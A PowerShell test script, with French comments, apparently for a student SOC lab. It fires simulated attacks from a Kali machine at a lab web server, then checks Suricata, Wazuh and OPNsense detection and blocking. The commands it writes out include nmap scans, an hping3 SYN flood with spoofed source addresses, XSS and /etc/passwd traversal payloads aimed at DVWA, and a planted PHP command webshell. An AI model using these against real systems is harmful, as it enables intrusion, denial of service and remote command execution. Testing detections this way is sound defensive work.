# Dossier de test (rejouable) : lance chaque evenement redoute depuis Kali, puis affiche
# la detection Suricata, la regle Wazuh et le blocage automatique.
#   .\tests\attaques.ps1            -> tous les tests
#   .\tests\attaques.ps1 er4        -> un seul (er1 / er2 / er3 / er4 / er5 / web)
#   .\tests\attaques.ps1 isolement  -> correlation + isolement de SRV-WEB (coupe 15 min, hors "tous")
. (Join-Path $PSScriptRoot "..\lib.ps1")
$o = "root@$($Ip.OpnWan)"; $k = "kali@$($Ip.Kali)"; $cible = $Ip.SrvWeb
$choix = if ($args.Count) { $args[0].ToLower() } else { "tous" }

function Flush { Invoke-SshScript $o "pfctl -t __wazuh_agent_drop -T flush >/dev/null" | Out-Null }
function Bilan($titre) {
    Start-Sleep 18
    Write-Host "`n=== $titre ===" -ForegroundColor Cyan
    Invoke-SshScript $o @'
echo "Suricata :"; tail -n 200 /var/log/suricata/eve.json | grep -o '"signature":"SOC [^"]*"' | sort | uniq -c
echo "Blocage  :"; pfctl -t __wazuh_agent_drop -T show
tail -n 1 /var/ossec/logs/active-responses.log
'@
}

if ($choix -in "tous", "er1") {
    Flush
    # ER1 : l'IP de Kali est ajoutee a la liste d'IOC le temps du test, puis retiree.
    # Suricata doit etre recharge dans les deux sens : avant le 10/11, la liste d'origine etait remise
    # sans rechargement et Kali restait IOC (alerte ER1 parasite a chaque attaque suivante).
    $recharger = "cd /root/soc-rules && (python3 -m http.server 8088 --bind 127.0.0.1 >/dev/null 2>&1 &); sleep 2; configctl ids update >/dev/null; sleep 40; pkill -f http.server; configctl ids install rules >/dev/null; configctl ids reload >/dev/null"
    Invoke-SshScript $o "sed -i '' 's/\[203.0.113.66\]/[203.0.113.66,$($Ip.Kali)]/' /root/soc-rules/soc-local.rules; $recharger"
    Invoke-SshScript $k "curl -s -o /dev/null --max-time 5 http://$cible/ ; echo 'acces depuis Kali (IOC)'"
    Bilan "ER1 - acces depuis une IP malveillante (IOC)"
    Invoke-SshScript $o "sed -i '' 's/\[203.0.113.66,$($Ip.Kali)\]/[203.0.113.66]/' /root/soc-rules/soc-local.rules; $recharger; echo 'liste IOC remise : Kali retiree'"
}
if ($choix -in "tous", "er4") {
    Flush
    Invoke-SshScript $k "sudo nmap -sS -Pn -n -p 1-500 -T4 $cible >/dev/null 2>&1; echo 'scan nmap envoye'"
    Bilan "ER4 - scan de ports (nmap -sS)"
}
if ($choix -in "tous", "er2") {
    # ER2 : paquets dont la source est usurpee (Chine 1.0.1.1, Coree du Nord 175.45.176.1) vers le WAN d'OPNsense.
    # Bloques par la regle flottante GeoIP PAYS_RISQUE, remontes par le journal du pare-feu (regle Wazuh 100108).
    Invoke-SshScript $k "sudo hping3 -S -p 443 -c 3 -a 1.0.1.1 $($Ip.OpnWan) >/dev/null 2>&1; sudo hping3 -S -p 22 -c 3 -a 175.45.176.1 $($Ip.OpnWan) >/dev/null 2>&1; echo 'paquets CN/KP envoyes'"
    Start-Sleep 30
    Write-Host "`n=== ER2 - acces depuis un pays a risque (GeoIP) ===" -ForegroundColor Cyan
    Invoke-SshScript $o "echo 'Pare-feu :'; grep -h 'a14d1a9b117c1458847da4258cd07764' /var/log/filter/latest.log | tail -n 6 | awk -F, '{print `$7, `$19, `"->`", `$20, `$17}'"
    Invoke-SshScript "wazuh-user@$($Ip.WazuhAdmin)" "echo 'Wazuh (100108) :'; sudo -n grep '`"id`":`"100108`"' /var/ossec/logs/alerts/alerts.json | tail -n 2 | grep -o '`"description`":`"[^`"]*`"'"
}
if ($choix -in "tous", "er3") {
    Flush
    Invoke-SshScript $k "printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}`$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!`$H+H*' > /tmp/eicar.com.txt; pkill -f 'http.server 80' 2>/dev/null; cd /tmp && (sudo python3 -m http.server 80 >/dev/null 2>&1 &); sleep 2"
    Invoke-SshScript "socadmin@$cible" "curl -s -o /dev/null --max-time 8 http://$($Ip.Kali)/eicar.com.txt; echo 'EICAR telecharge par SRV-WEB'" (Get-JumpOpts)
    Bilan "ER3 - transfert de malware (fichier EICAR)"
    Invoke-SshScript $k "pkill -f 'http.server 80' 2>/dev/null" | Out-Null
}
if ($choix -in "tous", "er5") {
    Flush
    Invoke-SshScript $k "sudo timeout 6 hping3 -S -p 80 -i u1500 $cible >/dev/null 2>&1; echo 'SYN flood envoye'"
    Bilan "ER5 - deni de service (SYN flood hping3)"
}
if ($choix -in "tous", "web") {
    Flush
    Invoke-SshScript $k "curl -s -o /dev/null 'http://$cible/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E'; curl -s -o /dev/null 'http://$cible/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd'; echo 'attaques web envoyees'"
    Bilan "Attaque applicative web (XSS + traversee de repertoire)"
}
if ($choix -eq "isolement") {
    # Hors "tous" : coupe SRV-WEB du reseau pendant 15 min (levee automatique).
    # Scan reseau (agent OPNsense) puis webshell dans /var/www/html (agent SRV-WEB) en moins de 5 min
    # -> correlation 100152 (niveau 15) -> isoler-hote.sh sur SRV-WEB.
    # Nom de fichier unique : supprimer un fichier de /var/www juste apres une alerte reseau declencherait aussi l'isolement.
    Flush
    Invoke-SshScript $k "sudo nmap -sS -Pn -n -p 1-300 -T4 $cible >/dev/null 2>&1; echo 'scan nmap envoye'"
    Start-Sleep 15
    $nom = "shell-test-$(Get-Random).php"
    Invoke-SshScript "socadmin@$cible" "printf '%s\n' '<?php system(`$_GET[`"c`"]); ?>' | sudo tee /var/www/html/$nom >/dev/null && echo 'webshell depose : $nom'" (Get-JumpOpts)
    Start-Sleep 45
    Write-Host "`n=== Isolement automatique de SRV-WEB (correlation 100152) ===" -ForegroundColor Cyan
    Invoke-SshScript $o "ping -c 2 -t 4 $cible >/dev/null 2>&1 && echo 'SRV-WEB joignable' || echo 'SRV-WEB ISOLE (plus de ping)'; nc -z -w 3 $cible 80 >/dev/null 2>&1 && echo 'port 80 ouvert' || echo 'port 80 injoignable'"
    Invoke-SshScript "wazuh-user@$($Ip.WazuhAdmin)" "sudo -n grep '`"id`":`"100152`"' /var/ossec/logs/alerts/alerts.json | tail -n 1 | grep -o '`"description`":`"[^`"]*`"'"
    Write-Host "Levee automatique dans 15 min (ou : sudo /var/ossec/active-response/bin/isoler-hote.sh --lever depuis la console de SRV-WEB)"
}

# Option "garder" (2e argument) : laisse Kali bloquee pour la montrer dans OPNsense (table __wazuh_agent_drop)
if ($args -contains "garder") {
    Write-Host "`nTests termines, Kali reste bloquee (voir OPNsense > Firewall > Diagnostics > Aliases > __wazuh_agent_drop)." -ForegroundColor Yellow
} else {
    Flush
    Write-Host "`nTests termines, Kali debloquee." -ForegroundColor Green
}
